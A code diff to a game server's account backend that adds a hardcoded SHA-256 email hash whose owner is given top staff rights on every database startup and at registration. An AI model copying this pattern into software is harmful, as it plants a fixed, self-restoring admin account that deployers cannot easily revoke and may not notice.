@@ -13,6 +13,28 @@ const googleKey = process.env.RECAPTCHA_SECRET || "";
 // OAuth client ID of the web client. Google ID tokens must be issued for it.
 const googleClientId = process.env.GOOGLE_CLIENT_ID || "";
 if (!googleClientId) console.log("GOOGLE_CLIENT_ID is not set: Google login is off.");
+
+// Google accounts that always get the top staff level: super developer (admin 6),
+// official staff (adminType 2), not limited. The repo is public, so emails are kept
+// as SHA-256 of the lowercased address. DEVELOPER_EMAILS (comma-separated) adds more.
+const emailHash = email => crypto.createHash('sha256').update(String(email || '').trim().toLowerCase()).digest('hex');
+const DEVELOPER_EMAIL_HASHES = new Set([
+    '8314ceeb8bd9953e2d2b5cc9182d01621f7c9a0ce4c65d26de6ff647ad4f0758',
+    ...String(process.env.DEVELOPER_EMAILS || '').split(',').map(e => e.trim()).filter(Boolean).map(emailHash),
+]);
+const isDeveloperEmail = email => DEVELOPER_EMAIL_HASHES.has(emailHash(email));
+
+async function grantDeveloperLevels() {
+    try {
+        const [result] = await connectionms.promise().query(
+            "UPDATE `users` SET `admin`=6, `adminType`=2, `limited`=0 WHERE SHA2(LOWER(TRIM(`email`)), 256) IN (?)" +
+            " AND (`admin` IS NULL OR `admin`<>6 OR `adminType`<>2 OR `limited`<>0)",
+            [[...DEVELOPER_EMAIL_HASHES]]);
+        if (result.affectedRows) console.log(`Gave ${result.affectedRows} developer account(s) the top staff level.`);
+    } catch (err) {
+        console.log("Could not set developer staff levels:", err.message);
+    }
+}
 if (!googleKey) console.log("RECAPTCHA_SECRET is not set: reCAPTCHA checks will fail, so leave the game server's ENABLE_CAPTCHA off.");
 var season = 0;
 
@@ -160,12 +182,14 @@ function addMissingShopColumns() {
             if (error) {
                 console.log("Could not check the shop item columns:", error.message);
                 console.log(`Database ready: ${dbConfig.host}:${dbConfig.port}/${dbConfig.database}`);
+                grantDeveloperLevels();
                 return;
             }
             const have = new Set(rows.map(r => r.COLUMN_NAME));
             const missing = shopitems.map(i => i.itemName).filter(n => /^\w+$/.test(n) && !have.has(n));
             if (!missing.length) {
                 console.log(`Database ready: ${dbConfig.host}:${dbConfig.port}/${dbConfig.database}`);
+                grantDeveloperLevels();
                 return;
             }
             const sql = "ALTER TABLE `users` " + missing.map(n => "ADD COLUMN `" + n + "` int(11) DEFAULT NULL").join(", ");
@@ -173,6 +197,7 @@ function addMissingShopColumns() {
                 if (err) console.log("Could not add shop item columns:", err.message);
                 else console.log(`Added ${missing.length} shop item column(s) to users.`);
                 console.log(`Database ready: ${dbConfig.host}:${dbConfig.port}/${dbConfig.database}`);
+                grantDeveloperLevels();
             });
         });
 }
@@ -310,6 +335,8 @@ async function registerUser(token, social, code) {
         }
         return out;
     });
+    // developer accounts get their staff level before the game server reads the account
+    if (out.success && email && isDeveloperEmail(email)) await grantDeveloperLevels();
     return out;
 }
 
